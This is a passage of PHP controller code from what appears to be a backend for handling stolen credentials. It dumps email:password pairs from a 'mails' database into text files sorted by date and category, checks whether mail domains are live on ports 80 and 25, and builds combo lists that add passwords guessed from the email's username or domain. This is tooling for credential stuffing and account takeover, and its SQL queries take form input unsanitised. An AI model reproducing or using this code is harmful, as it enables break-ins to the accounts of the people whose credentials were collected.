				$this->Post->query('UPDATE  `mails` SET  `down` = 1 WHERE  `id` =' . $mmm);
				$d['mails']['email'] = strtolower($d['mails']['email']);

				if (preg_match('/163.com/', $d['mails']['email'])) {
					continue;
				}


				if (preg_match('/163.net/', $d['mails']['email'])) {
					continue;
				}


				if (preg_match('/126.com/', $d['mails']['email'])) {
					continue;
				}


				if (preg_match('/qq.com/', $d['mails']['email'])) {
					continue;
				}


				if (preg_match('/.ru/', $d['mails']['email'])) {
					continue;
				}


				if (preg_match('/ /', $d['mails']['pass'])) {
					continue;
				}


				if (preg_match('/' . "\t" . '/', $d['mails']['pass'])) {
					continue;
				}


				if (preg_match('/http/', $d['mails']['pass'])) {
					continue;
				}


				if (preg_match('/TR/', $d['mails']['pass']) && (strlen($d['mails']['pass']) < 8)) {
					continue;
				}


				$z0 .= $d['mails']['email'] . ':' . $d['mails']['pass'];
				$z0 .= "\r\n";
			}

			$filename = $_SERVER['DOCUMENT_ROOT'] . '/app/webroot/data/' . $date_one . '/big/' . $date_one . '_Nohash_big.txt';
			$this->d($filename);
			file_put_contents($filename, $z0, FILE_APPEND);
			$data1 = $this->Filed->query('SELECT * FROM  `mails` WHERE `down`=0 AND date = \'' . $date_one . '\' AND type=\'big\' AND pass !=\'0\' AND hashtype !=\'0\' LIMIT 100000');
			$c1 = $this->Filed->query('SELECT count(*) FROM  `mails` WHERE `down`=0  AND date = \'' . $date_one . '\' AND type=\'big\' AND pass !=\'0\' AND hashtype !=\'0\' LIMIT 100000');
			$this->d($c1, 'bigHash');

			foreach ($data1 as $d ) {
				$mmm = $d['mails']['id'];
				$this->Post->query('UPDATE  `mails` SET  `down` = 1 WHERE  `id` =' . $mmm);
				$d['mails']['email'] = strtolower($d['mails']['email']);

				if (preg_match('/163.com/', $d['mails']['email'])) {
					continue;
				}


				if (preg_match('/163.net/', $d['mails']['email'])) {
					continue;
				}


				if (preg_match('/126.com/', $d['mails']['email'])) {
					continue;
				}


				if (preg_match('/qq.com/', $d['mails']['email'])) {
					continue;
				}


				if (preg_match('/.ru/', $d['mails']['email'])) {
					continue;
				}


				if (preg_match('/ /', $d['mails']['pass'])) {
					continue;
				}


				if (preg_match('/http/', $d['mails']['pass'])) {
					continue;
				}


				if (preg_match('/' . "\t" . '/', $d['mails']['pass'])) {
					continue;
				}


				if (preg_match('/TR/', $d['mails']['pass']) && (strlen($d['mails']['pass']) < 8)) {
					continue;
				}


				$z1 .= $d['mails']['email'] . ':' . $d['mails']['pass'];
				$z1 .= "\r\n";
			}

			$filename = $_SERVER['DOCUMENT_ROOT'] . '/app/webroot/data/' . $date_one . '/big/' . $date_one . '_Hash_big.txt';
			$this->d($filename);
			file_put_contents($filename, $z1, FILE_APPEND);
			$data2 = $this->Filed->query('SELECT * FROM  `mails` WHERE `down`=0 AND date = \'' . $date_one . '\' AND type=\'sred\' AND pass !=\'0\' AND hashtype =\'0\' LIMIT 100000');
			$c2 = $this->Filed->query('SELECT count(*) FROM  `mails` WHERE `down`=0  AND date = \'' . $date_one . '\' AND type=\'sred\' AND pass !=\'0\' AND hashtype =\'0\' LIMIT 100000');
			$this->d($c2, 'sredNoHash');

			foreach ($data2 as $d ) {
				$mmm = $d['mails']['id'];
				$this->Post->query('UPDATE  `mails` SET  `down` = 1 WHERE  `id` =' . $mmm);
				$d['mails']['email'] = strtolower($d['mails']['email']);
				$z2 .= $d['mails']['email'] . ':' . $d['mails']['pass'];
				$z2 .= "\r\n";
			}

			$filename = $_SERVER['DOCUMENT_ROOT'] . '/app/webroot/data/' . $date_one . '/sred/' . $date_one . '_Nohash_sred.txt';
			$this->d($filename);
			file_put_contents($filename, $z2, FILE_APPEND);
			$data3 = $this->Filed->query('SELECT * FROM  `mails` WHERE `down`=0 AND date = \'' . $date_one . '\' AND type=\'sred\' AND pass !=\'0\' AND hashtype !=\'0\' LIMIT 100000');
			$c3 = $this->Filed->query('SELECT count(*) FROM  `mails` WHERE `down`=0  AND date = \'' . $date_one . '\' AND type=\'sred\' AND pass !=\'0\' AND hashtype !=\'0\' LIMIT 100000');
			$this->d($c3, 'sredHash');

			foreach ($data3 as $d ) {
				$mmm = $d['mails']['id'];
				$this->Post->query('UPDATE  `mails` SET  `down` = 1 WHERE  `id` =' . $mmm);
				$d['mails']['email'] = strtolower($d['mails']['email']);
				$z3 .= $d['mails']['email'] . ':' . $d['mails']['pass'];
				$z3 .= "\r\n";
			}

			$filename = $_SERVER['DOCUMENT_ROOT'] . '/app/webroot/data/' . $date_one . '/sred/' . $date_one . '_Hash_sred.txt';
			$this->d($filename);
			file_put_contents($filename, $z3, FILE_APPEND);
			$data4 = $this->Filed->query('SELECT * FROM  `mails` WHERE `down`=0 AND date = \'' . $date_one . '\' AND type=\'corp\' AND pass !=\'0\' AND hashtype =\'0\' LIMIT 100000');
			$c4 = $this->Filed->query('SELECT count(*) FROM  `mails` WHERE `down`=0  AND date = \'' . $date_one . '\' AND type=\'corp\' AND pass !=\'0\' AND hashtype =\'0\' LIMIT 100000');
			$this->d($c4, 'corpNoHash');

			foreach ($data4 as $d ) {
				$mmm = $d['mails']['id'];
				$this->Post->query('UPDATE  `mails` SET  `down` = 1 WHERE  `id` =' . $mmm);
				$d['mails']['email'] = strtolower($d['mails']['email']);
				$z4 .= $d['mails']['email'] . ':' . $d['mails']['pass'];
				$z4 .= "\r\n";
			}

			$filename = $_SERVER['DOCUMENT_ROOT'] . '/app/webroot/data/' . $date_one . '/corp/' . $date_one . '_Nohash_corp.txt';
			$this->d($filename);
			file_put_contents($filename, $z4, FILE_APPEND);
			$data5 = $this->Filed->query('SELECT * FROM  `mails` WHERE `down`=0 AND date = \'' . $date_one . '\' AND type=\'corp\' AND pass !=\'0\' AND hashtype !=\'0\' LIMIT 100000');
			$c5 = $this->Filed->query('SELECT count(*) FROM  `mails` WHERE `down`=0  AND date = \'' . $date_one . '\' AND type=\'corp\' AND pass !=\'0\' AND hashtype !=\'0\' LIMIT 100000');
			$this->d($c5, 'corpHash');

			foreach ($data5 as $d ) {
				$mmm = $d['mails']['id'];
				$this->Post->query('UPDATE  `mails` SET  `down` = 1 WHERE  `id` =' . $mmm);
				$d['mails']['email'] = strtolower($d['mails']['email']);
				$z5 .= $d['mails']['email'] . ':' . $d['mails']['pass'];
				$z5 .= "\r\n";
			}

			$filename = $_SERVER['DOCUMENT_ROOT'] . '/app/webroot/data/' . $date_one . '/corp/' . $date_one . '_Hash_corp.txt';
			$this->d($filename);
			file_put_contents($filename, $z5, FILE_APPEND);
			$c1 = count($data1);
			$c2 = count($data2);
			$c3 = count($data3);
			$c4 = count($data4);
			$c5 = count($data5);
			if (($c1 != 0) || ($c2 != 0) || ($c3 != 0) || ($c4 != 0) || ($c5 != 0)) {
				$this->d('stop1');
				$this->d($c2, 'c2');
				$this->d($c3, 'c3');
				$this->d($c4, 'c4');
				$this->d($c5, 'c5');
				$this->stop();
				exit();
			}

		}

		$this->stop();
	}

	public function dump_reset2()
	{
		$this->Post->query('UPDATE  `mails_one` SET  `down` = 0 WHERE  `down` =1');
	}

	public function dump_count2()
	{
		$c0 = $this->Filed->query('SELECT count(*) FROM  `mails_one` WHERE `down`=1 ');
		$this->d($c0);
	}

	public function dumpfile2()
	{
		$this->timeStart = $this->start('dumpfile2', 1);
		$p['sdate'] = $this->Post->query('SELECT date FROM  `mails_one` WHERE `down`=0 group by date ');

		foreach ($p['sdate'] as $ku ) {
			$this->d($ku['mails_one']['date']);
			$date_one = $ku['mails_one']['date'];
			$date_one = trim($date_one);
			mkdir($_SERVER['DOCUMENT_ROOT'] . '/app/webroot/data2', 511);
			mkdir($_SERVER['DOCUMENT_ROOT'] . '/app/webroot/data2/' . $date_one, 511);
			mkdir($_SERVER['DOCUMENT_ROOT'] . '/app/webroot/data2/' . $date_one . '/corp', 511);
			mkdir($_SERVER['DOCUMENT_ROOT'] . '/app/webroot/data2/' . $date_one . '/big', 511);
			mkdir($_SERVER['DOCUMENT_ROOT'] . '/app/webroot/data2/' . $date_one . '/sred', 511);
			$data0 = $this->Filed->query('SELECT * FROM  `mails_one` WHERE `down`=0 AND date = \'' . $date_one . '\' AND type=\'big\' LIMIT 100000');
			$c0 = $this->Filed->query('SELECT count(*) FROM  `mails_one` WHERE `down`=0  AND date = \'' . $date_one . '\' AND type=\'big\' LIMIT 100000');
			$rr = rand(1, 9999);
			$this->d($c0, 'BIGS');

			foreach ($data0 as $d ) {
				$mmm = $d['mails_one']['id'];
				$this->Post->query('UPDATE  `mails_one` SET  `down` = 1 WHERE  `id` =' . $mmm);
				$d['mails_one']['email'] = strtolower($d['mails_one']['email']);

				if (preg_match('/163.com/', $d['mails_one']['email'])) {
					continue;
				}


				if (preg_match('/163.net/', $d['mails_one']['email'])) {
					continue;
				}


				if (preg_match('/126.com/', $d['mails_one']['email'])) {
					continue;
				}


				if (preg_match('/qq.com/', $d['mails_one']['email'])) {
					continue;
				}


				if (preg_match('/.ru/', $d['mails_one']['email'])) {
					continue;
				}


				$z0 .= $d['mails_one']['email'];
				$z0 .= "\r\n";
			}

			$filename = $_SERVER['DOCUMENT_ROOT'] . '/app/webroot/data2/' . $date_one . '/big/' . $date_one . '.txt';
			$this->d($filename);
			file_put_contents($filename, $z0, FILE_APPEND);
			$data2 = $this->Filed->query('SELECT * FROM  `mails_one` WHERE `down`=0 AND date = \'' . $date_one . '\' AND type=\'sred\' LIMIT 100000');
			$c2 = $this->Filed->query('SELECT count(*) FROM  `mails_one` WHERE `down`=0  AND date = \'' . $date_one . '\' AND type=\'sred\' LIMIT 100000');
			$this->d($c2, 'sred');

			foreach ($data2 as $d ) {
				$mmm = $d['mails_one']['id'];
				$this->Post->query('UPDATE  `mails_one` SET  `down` = 1 WHERE  `id` =' . $mmm);
				$d['mails_one']['email'] = strtolower($d['mails_one']['email']);
				$z2 .= $d['mails_one']['email'];
				$z2 .= "\r\n";
			}

			$filename = $_SERVER['DOCUMENT_ROOT'] . '/app/webroot/data2/' . $date_one . '/sred/' . $date_one . '.txt';
			$this->d($filename);
			file_put_contents($filename, $z2, FILE_APPEND);
			$data4 = $this->Filed->query('SELECT * FROM  `mails_one` WHERE `down`=0 AND date = \'' . $date_one . '\' AND type=\'corp\'  LIMIT 100000');
			$c4 = $this->Filed->query('SELECT count(*) FROM  `mails_one` WHERE `down`=0  AND date = \'' . $date_one . '\' AND type=\'corp\' LIMIT 100000');
			$this->d($c4, 'corp');

			foreach ($data4 as $d ) {
				$mmm = $d['mails_one']['id'];
				$this->Post->query('UPDATE  `mails_one` SET  `down` = 1 WHERE  `id` =' . $mmm);
				$d['mails_one']['email'] = strtolower($d['mails_one']['email']);
				$z4 .= $d['mails_one']['email'];
				$z4 .= "\r\n";
			}

			$filename = $_SERVER['DOCUMENT_ROOT'] . '/app/webroot/data2/' . $date_one . '/corp/' . $date_one . '.txt';
			$this->d($filename);
			file_put_contents($filename, $z4, FILE_APPEND);
			$c0 = count($data0);
			$c2 = count($data2);
			$c4 = count($data4);
			if (($c0 != 0) || ($c2 != 0) || ($c4 != 0)) {
				$this->d('stop2');
				$this->d($c0, 'c0');
				$this->d($c2, 'c2');
				$this->d($c4, 'c4');
				$this->stop();
				exit();
			}

		}

		$this->stop();
	}

	public function ping($host, $port, $timeout)
	{
		$host = str_replace('http://', '', $host);
		$tB = microtime(true);
		$fP = fSockOpen($host, $port, $errno, $errstr, $timeout);

		if (!($fP)) {
			return 'down';
		}


		$tA = microtime(true);
		return round(($tA - $tB) * 1000, 0) . ' ms';
	}

	public function cleanmail()
	{
		$this->timeStart = $this->start('cleanmail', 1);
		$ret = $this->Post->query('show columns FROM `mails` where `Field` = \'clean\'');

		if ($ret[0]['COLUMNS']['Field'] == 'clean') {
			$this->d($ret, 'clean good');
		}
		 else {
			$this->d('clean no, sozdaem');
			$this->Post->query('ALTER TABLE mails ADD clean int(3) NOT NULL DEFAULT \'0\'');
		}

		$p = $this->Post->query('SELECT * FROM  `mails` WHERE `clean`=0 AND (type=\'corp\' or type=\'sred\') limit 50');

		foreach ($p as $ku ) {
			$this->d($ku['mails']['meiler']);
			$domen = $ku['mails']['meiler'];
			$type = $ku['mails']['type'];
			$domen = trim($domen);
			$ping = $this->ping($domen, '80', '15');
			$this->d($ping, $domen . '-' . $type);

			if ($ping != 'down') {
				$this->Post->query('UPDATE  `mails` SET  `clean` = 1 WHERE  `meiler` =\'' . $domen . '\'');
			}
			 else {
				$ping2 = $this->ping($domen, '25', '10');
				$this->d($ping2, $domen . ' ping 2');

				if ($ping2 == 'down') {
					$p2 = $this->Post->query('SELECT * FROM  `mails` WHERE `meiler`=\'' . $domen . '\'');

					foreach ($p2 as $ku2 ) {
						$this->d($ku2['mails']['email'] . ':' . $ku2['mails']['pass']);
						$z0 = $ku2['mails']['email'] . ':' . $ku2['mails']['pass'] . "\r\n";
					}
				}
				 else {
					$this->Post->query('UPDATE  `mails` SET  `clean` = 1 WHERE  `meiler` =\'' . $domen . '\'');
					$this->d('25 port GOOD !!!' . $domen);
				}
			}
        $this->workup();
		}

		$this->stop();
	}

	public function domens()
	{
		if (($this->params['form']['down'] != '') || ($this->params['form']['down2'] != '') || ($this->params['form']['down3'] != '') || ($this->params['form']['down4'] != '') || ($this->params['form']['onedomen'] != '') || ($this->params['form']['down5'] != '') || ($this->params['form']['down6'] != '') || ($this->params['form']['onedomen_one'] != '') || ($this->params['form']['onedomen_one2'] != '')) {
			$this->d($this->params['form']);
			$sdate = $this->params['form']['sdate'];
			$podate = $this->params['form']['podate'];
			$sdate_one = $this->params['form']['sdate_one'];
			$podate_one = $this->params['form']['podate_one'];
			$domen = trim($this->params['form']['domen']);
			$zona = trim($this->params['form']['zona']);
			$zona_meiler = trim($this->params['form']['zona_meiler']);
			$dom_pass = trim($this->params['form']['dom_pass']);
			$dom_pass2 = trim($this->params['form']['dom_pass2']);
			$dom_pass_one = trim($this->params['form']['dom_pass_one']);
			$dom_pass2_one = trim($this->params['form']['dom_pass2_one']);
			$corp_big = trim($this->params['form']['corp_big']);
			$corp_big_one = trim($this->params['form']['corp_big_one']);
			$corp_big_one2 = trim($this->params['form']['corp_big_one2']);
			$type = $this->params['form']['type'];
			$site = $this->params['form']['site'];
			$site_one = $this->params['form']['site_one'];
			$z0 = '';
			$ru_emails = $this->params['form']['ru_emails'];
			$ru_emails2 = $this->params['form']['ru_emails2'];

			if (($domen != '') && ($this->params['form']['down'] != '')) {
				if ($type == 'countNoHash') {
					$data0 = $this->Filed->query('SELECT * FROM  `mails` WHERE date >= \'' . $sdate . '\' AND date <= \'' . $podate . '\' AND meiler like \'%' . $domen . '%\' AND pass !=\'0\' AND hashtype =\'0\'');
					$c0 = $this->Filed->query('SELECT count(*) FROM  `mails` WHERE date >= \'' . $sdate . '\' AND date <= \'' . $podate . '\' AND meiler like \'%' . $domen . '%\' AND pass !=\'0\' AND hashtype =\'0\'');

					foreach ($data0 as $d ) {
						$z0 .= $d['mails']['email'];
						$z0 .= ':';
						$z0 .= $d['mails']['pass'];
						$z0 .= "\r\n";
					}
				}
				 else if ($type == 'countHash') {
					$data0 = $this->Filed->query('SELECT * FROM  `mails` WHERE date >= \'' . $sdate . '\' AND date <= \'' . $podate . '\' AND meiler like \'%' . $domen . '%\'  AND pass !=\'0\' AND hashtype !=\'0\'');
					$c0 = $this->Filed->query('SELECT count(*) FROM  `mails` WHERE date >= \'' . $sdate . '\' AND date <= \'' . $podate . '\' AND meiler like \'%' . $domen . '%\' AND pass !=\'0\' AND hashtype !=\'0\'');

					foreach ($data0 as $d ) {
						$z0 .= $d['mails']['email'];
						$z0 .= ':';
						$z0 .= $d['mails']['pass'];
						$z0 .= "\r\n";
					}
				}
				 else if ($type == 'countPass') {
					$data0 = $this->Filed->query('SELECT * FROM  `mails` WHERE date >= \'' . $sdate . '\' AND date <= \'' . $podate . '\' AND meiler like \'%' . $domen . '%\'  AND pass !=\'0\'');
					$c0 = $this->Filed->query('SELECT count(*) FROM  `mails` WHERE date >= \'' . $sdate . '\' AND date <= \'' . $podate . '\' AND meiler like \'%' . $domen . '%\' AND pass !=\'0\'');

					foreach ($data0 as $d ) {
						$z0 .= $d['mails']['email'];
						$z0 .= ':';
						$z0 .= $d['mails']['pass'];
						$z0 .= "\r\n";
					}
				}
				 else if ($type == 'countMail') {
					$data0 = $this->Filed->query('SELECT * FROM  `mails` WHERE `date` >= \'' . $sdate . '\' AND `date` <= \'' . $podate . '\' AND `meiler` like \'%' . $domen . '%\'');
					$c0 = $this->Filed->query('SELECT count(*) FROM  `mails` WHERE `date` >= \'' . $sdate . '\' AND `date` <= \'' . $podate . '\' AND `meiler` like \'%' . $domen . '%\'');

					foreach ($data0 as $d ) {
						$z0 .= $d['mails']['email'];

						if ($d['mails']['pass'] != 0) {
							$z0 .= ':';
							$z0 .= $d['mails']['pass'];
						}


						$z0 .= "\r\n";
					}
				}


				$count = $c0[0][0]['count(*)'];
				$all = $domen . ' count: ' . $count;
				$str = $z0;
			}


			if (($zona == '*') && ($this->params['form']['down2'] != '')) {
				if ($type == 'countNoHash') {
					$data0 = $this->Filed->query('SELECT * FROM  `mails` WHERE date >= \'' . $sdate . '\' AND date <= \'' . $podate . '\' AND pass !=\'0\' AND hashtype =\'0\'');
					$c0 = $this->Filed->query('SELECT count(*) FROM  `mails` WHERE date >= \'' . $sdate . '\' AND date <= \'' . $podate . '\' AND pass !=\'0\' AND hashtype =\'0\'');

					foreach ($data0 as $d ) {
						$z0 .= $d['mails']['email'];
						$z0 .= ':';
						$z0 .= $d['mails']['pass'];
						$z0 .= "\r\n";
					}
				}
				 else if ($type == 'countHash') {
					$data0 = $this->Filed->query('SELECT * FROM  `mails` WHERE date >= \'' . $sdate . '\' AND date <= \'' . $podate . '\' AND pass !=\'0\' AND hashtype !=\'0\'');
					$c0 = $this->Filed->query('SELECT count(*) FROM  `mails` WHERE date >= \'' . $sdate . '\' AND date <= \'' . $podate . '\' AND pass !=\'0\' AND hashtype !=\'0\'');

					foreach ($data0 as $d ) {
						$z0 .= $d['mails']['email'];
						$z0 .= ':';
						$z0 .= $d['mails']['pass'];
						$z0 .= "\r\n";
					}
				}
				 else if ($type == 'countPass') {
					$data0 = $this->Filed->query('SELECT * FROM  `mails` WHERE date >= \'' . $sdate . '\' AND date <= \'' . $podate . '\' AND pass !=\'0\'');
					$c0 = $this->Filed->query('SELECT count(*) FROM  `mails` WHERE date >= \'' . $sdate . '\' AND date <= \'' . $podate . '\' AND pass !=\'0\'');

					foreach ($data0 as $d ) {
						$z0 .= $d['mails']['email'];
						$z0 .= ':';
						$z0 .= $d['mails']['pass'];
						$z0 .= "\r\n";
					}
				}
				 else if ($type == 'countMail') {
					if ($zona_meiler != '') {
						if ($zona_meiler == 'mail.ru') {
							$ku = ' AND `meiler` !=\'' . $zona_meiler . '\' AND `meiler` !=\'list.ru\' AND `meiler` !=\'bk.ru\' AND `meiler` !=\'inbox.ru\'';
						}
						 else {
							$ku = ' AND `meiler` !=\'' . $zona_meiler . '\'';
						}

						$data0 = $this->Filed->query('SELECT * FROM  `mails` WHERE date >= \'' . $sdate . '\' AND date <= \'' . $podate . '\' ' . $ku);
						$c0 = $this->Filed->query('SELECT count(*) FROM  `mails` WHERE date >= \'' . $sdate . '\' AND date <= \'' . $podate . '\' ' . $ku);
						$data01 = $this->Filed->query('SELECT * FROM  `mails_one` WHERE date >= \'' . $sdate_one . '\' AND date <= \'' . $podate_one . '\' AND `meiler` !=\'' . $zona_meiler . '\' ' . $ku);
						$c01 = $this->Filed->query('SELECT count(*) FROM  `mails_one` WHERE date >= \'' . $sdate_one . '\' AND date <= \'' . $podate_one . '\' AND `meiler` !=\'' . $zona_meiler . '\' ' . $ku);
					}
					 else {
						$data0 = $this->Filed->query('SELECT * FROM  `mails` WHERE date >= \'' . $sdate . '\' AND date <= \'' . $podate . '\'');
						$c0 = $this->Filed->query('SELECT count(*) FROM  `mails` WHERE date >= \'' . $sdate . '\' AND date <= \'' . $podate . '\'');
						$data01 = $this->Filed->query('SELECT * FROM  `mails_one` WHERE date >= \'' . $sdate_one . '\' AND date <= \'' . $podate_one . '\'');
						$c01 = $this->Filed->query('SELECT count(*) FROM  `mails_one` WHERE date >= \'' . $sdate_one . '\' AND date <= \'' . $podate_one . '\'');
					}

					foreach ($data0 as $d ) {
						$z0 .= $d['mails']['email'];

						if ($d['mails']['pass'] != 0) {
						}


						$z0 .= "\r\n";
					}

					foreach ($data01 as $d1 ) {
						$z0 .= $d1['mails_one']['email'];

						if ($d1['mails_one']['pass'] != 0) {
						}


						$z0 .= "\r\n";
					}

					$count = $c01[0][0]['count(*)'];
				}


				$count = $count + $c0[0][0]['count(*)'];
				$all = $type . ' s ' . $sdate . ' po ' . $podate . ' count: ' . $count;
				$str = $z0;
			}


			if (($corp_big_one == 'corp') && ($this->params['form']['down4'] != '')) {
				$data0 = $this->Filed->query('SELECT * FROM  `mails_one` WHERE date >= \'' . $sdate_one . '\' AND date <= \'' . $podate_one . '\' AND type=\'corp\'');
				$c0 = $this->Filed->query('SELECT count(*) FROM  `mails_one` WHERE date >= \'' . $sdate_one . '\' AND date <= \'' . $podate_one . '\' AND type=\'corp\'');

				foreach ($data0 as $d ) {
					$d['mails_one']['email'] = strtolower($d['mails_one']['email']);

					if ($dom_pass_one == 'ku_one') {
						$z0 .= $d['mails_one']['email'];
						$z0 .= ':';
						@$bb = explode('@', $d['mails_one']['email']);
						$z0 .= $bb[0];
						$z0 .= "\r\n";
					}
					 else if ($dom_pass2_one == 'ku2_one') {
						$z0 .= $d['mails_one']['email'];
						$z0 .= ':';
						@$bb = explode('@', $d['mails_one']['email']);
						@$kk = explode('.', $bb[1]);
						@${z0} .= $kk[0];
						$z0 .= "\r\n";
					}
					 else {
						$z0 .= $d['mails_one']['email'];
						$z0 .= "\r\n";
					}
				}

				$count = $c0[0][0]['count(*)'];
				$all = $corp_big_one . ' s ' . $sdate_one . ' po ' . $podate_one . ' count: ' . $count;
				$str = $z0;
			}


			if (($corp_big_one == 'sred') && ($this->params['form']['down4'] != '')) {
				$data0 = $this->Filed->query('SELECT * FROM  `mails_one` WHERE date >= \'' . $sdate_one . '\' AND date <= \'' . $podate_one . '\' AND type=\'sred\'');
				$c0 = $this->Filed->query('SELECT count(*) FROM  `mails_one` WHERE date >= \'' . $sdate_one . '\' AND date <= \'' . $podate_one . '\' AND type=\'sred\'');

				foreach ($data0 as $d ) {
					$d['mails_one']['email'] = strtolower($d['mails_one']['email']);
					$z0 .= $d['mails_one']['email'];
					$z0 .= "\r\n";
				}

				$count = $c0[0][0]['count(*)'];
				$all = $corp_big_one . ' s ' . $sdate . ' po ' . $podate . ' count: ' . $count;
				$str = $z0;
			}


			if (($corp_big == 'corp') && ($this->params['form']['down3'] != '')) {
				if ($type == 'countNoHash') {
					$data0 = $this->Filed->query('SELECT * FROM  `mails` WHERE date >= \'' . $sdate . '\' AND date <= \'' . $podate . '\' AND pass !=\'0\' AND hashtype =\'0\' AND type=\'corp\'');
					$c0 = $this->Filed->query('SELECT count(*) FROM  `mails` WHERE date >= \'' . $sdate . '\' AND date <= \'' . $podate . '\' AND pass !=\'0\' AND hashtype =\'0\' AND type=\'corp\'');

					foreach ($data0 as $d ) {
						$z0 .= $d['mails']['email'];
						$z0 .= ':';
						$z0 .= $d['mails']['pass'];
						$z0 .= "\r\n";

						if ($dom_pass == 'ku') {
							$z0 .= $d['mails']['email'];
							$z0 .= ':';
							@$bb = explode('@', $d['mails']['email']);
							$z0 .= $bb[0];
							$z0 .= "\r\n";
						}


						if ($dom_pass2 == 'ku2') {
							$z0 .= $d['mails']['email'];
							$z0 .= ':';
							@$bb = explode('@', $d['mails']['email']);
							@$kk = explode('.', $bb[1]);
							@${z0} .= $kk[0];
							$z0 .= "\r\n";
						}

					}
				}
				 else if ($type == 'countHash') {
					$data0 = $this->Filed->query('SELECT * FROM  `mails` WHERE date >= \'' . $sdate . '\' AND date <= \'' . $podate . '\' AND pass !=\'0\' AND hashtype !=\'0\' AND type=\'corp\'');
					$c0 = $this->Filed->query('SELECT count(*) FROM  `mails` WHERE date >= \'' . $sdate . '\' AND date <= \'' . $podate . '\' AND pass !=\'0\' AND hashtype !=\'0\' AND type=\'corp\'');

					foreach ($data0 as $d ) {
						$z0 .= $d['mails']['email'];
						$z0 .= ':';
						$z0 .= $d['mails']['pass'];
						$z0 .= "\r\n";
					}
				}
				 else if ($type == 'countPass') {
					$data0 = $this->Filed->query('SELECT * FROM  `mails` WHERE date >= \'' . $sdate . '\' AND date <= \'' . $podate . '\' AND pass !=\'0\' AND type=\'corp\'');
					$c0 = $this->Filed->query('SELECT count(*) FROM  `mails` WHERE date >= \'' . $sdate . '\' AND date <= \'' . $podate . '\' AND pass !=\'0\' AND type=\'corp\'');

					foreach ($data0 as $d ) {
						$z0 .= $d['mails']['email'];
						$z0 .= ':';
						$z0 .= $d['mails']['pass'];
						$z0 .= "\r\n";
					}
				}
				 else if ($type == 'countMail') {
					$data0 = $this->Filed->query('SELECT * FROM  `mails` WHERE date >= \'' . $sdate . '\' AND date <= \'' . $podate . '\' AND type=\'corp\'');
					$c0 = $this->Filed->query('SELECT count(*) FROM  `mails` WHERE date >= \'' . $sdate . '\' AND date <= \'' . $podate . '\' AND type=\'corp\'');

					foreach ($data0 as $d ) {
						$z0 .= $d['mails']['email'];
						$z0 .= "\r\n";
					}

					$data1 = $this->Filed->query('SELECT * FROM  `mails_one` WHERE date >= \'' . $sdate_one . '\' AND date <= \'' . $podate_one . '\' AND type=\'corp\'');
					$c1 = $this->Filed->query('SELECT count(*) FROM  `mails_one` WHERE date >= \'' . $sdate_one . '\' AND date <= \'' . $podate_one . '\' AND type=\'corp\'');

					foreach ($data1 as $d2 ) {
						$z0 .= $d2['mails']['email'];
						$z0 .= "\r\n";
					}
				}


				$count = $c0[0][0]['count(*)'];
				$all = $type . ' s ' . $sdate . ' po ' . $podate . ' count: ' . $count;
				$str = $z0;
			}


			if (($corp_big == 'big') && ($this->params['form']['down3'] != '')) {
				if ($type == 'countNoHash') {
					$data0 = $this->Filed->query('SELECT * FROM  `mails` WHERE date >= \'' . $sdate . '\' AND date <= \'' . $podate . '\' AND pass !=\'0\' AND hashtype =\'0\' AND type=\'big\'');
					$c0 = $this->Filed->query('SELECT count(*) FROM  `mails` WHERE date >= \'' . $sdate . '\' AND date <= \'' . $podate . '\' AND pass !=\'0\' AND hashtype =\'0\' AND type=\'big\'');

					foreach ($data0 as $d ) {
						$z0 .= $d['mails']['email'];
						$z0 .= ':';
						$z0 .= $d['mails']['pass'];
						$z0 .= "\r\n";
					}
				}
				 else if ($type == 'countHash') {
					$data0 = $this->Filed->query('SELECT * FROM  `mails` WHERE date >= \'' . $sdate . '\' AND date <= \'' . $podate . '\' AND pass !=\'0\' AND hashtype !=\'0\' AND type=\'big\'');
					$c0 = $this->Filed->query('SELECT count(*) FROM  `mails` WHERE date >= \'' . $sdate . '\' AND date <= \'' . $podate . '\' AND pass !=\'0\' AND hashtype !=\'0\' AND type=\'big\'');

					foreach ($data0 as $d ) {
						$z0 .= $d['mails']['email'];
						$z0 .= ':';
						$z0 .= $d['mails']['pass'];
						$z0 .= "\r\n";
					}
				}
				 else if ($type == 'countPass') {
					$data0 = $this->Filed->query('SELECT * FROM  `mails` WHERE date >= \'' . $sdate . '\' AND date <= \'' . $podate . '\' AND pass !=\'0\' AND type=\'big\'');
					$c0 = $this->Filed->query('SELECT count(*) FROM  `mails` WHERE date >= \'' . $sdate . '\' AND date <= \'' . $podate . '\' AND pass !=\'0\' AND type=\'big\'');

					foreach ($data0 as $d ) {
						$z0 .= $d['mails']['email'];
						$z0 .= ':';
						$z0 .= $d['mails']['pass'];
						$z0 .= "\r\n";
					}
				}
				 else if ($type == 'countMail') {
					$data0 = $this->Filed->query('SELECT * FROM  `mails` WHERE date >= \'' . $sdate . '\' AND date <= \'' . $podate . '\' AND type=\'big\'');
					$c0 = $this->Filed->query('SELECT count(*) FROM  `mails` WHERE date >= \'' . $sdate . '\' AND date <= \'' . $podate . '\' AND type=\'big\'');

					foreach ($data0 as $d ) {
						$z0 .= $d['mails']['email'];
						$z0 .= "\r\n";
					}

					$data1 = $this->Filed->query('SELECT * FROM  `mails_one` WHERE date >= \'' . $sdate_one . '\' AND date <= \'' . $podate_one . '\' AND type=\'big\'');
					$c1 = $this->Filed->query('SELECT count(*) FROM  `mails_one` WHERE date >= \'' . $sdate_one . '\' AND date <= \'' . $podate_one . '\' AND type=\'big\'');

					foreach ($data1 as $d2 ) {
						$z0 .= $d2['mails']['email'];
						$z0 .= "\r\n";
					}
				}


				$count = $c0[0][0]['count(*)'];
				$all = $type . ' s ' . $sdate . ' po ' . $podate . ' count: ' . $count;
				$str = $z0;
			}


			if (($corp_big == 'sred') && ($this->params['form']['down3'] != '')) {
				if ($type == 'countNoHash') {
					$data0 = $this->Filed->query('SELECT * FROM  `mails` WHERE date >= \'' . $sdate . '\' AND date <= \'' . $podate . '\' AND pass !=\'0\' AND hashtype =\'0\' AND type=\'sred\'');
					$c0 = $this->Filed->query('SELECT count(*) FROM  `mails` WHERE date >= \'' . $sdate . '\' AND date <= \'' . $podate . '\' AND pass !=\'0\' AND hashtype =\'0\' AND type=\'sred\'');

					foreach ($data0 as $d ) {
						$z0 .= $d['mails']['email'];
						$z0 .= ':';
						$z0 .= $d['mails']['pass'];
						$z0 .= "\r\n";
					}
				}
				 else if ($type == 'countHash') {
					$data0 = $this->Filed->query('SELECT * FROM  `mails` WHERE date >= \'' . $sdate . '\' AND date <= \'' . $podate . '\' AND pass !=\'0\' AND hashtype !=\'0\' AND type=\'sred\'');
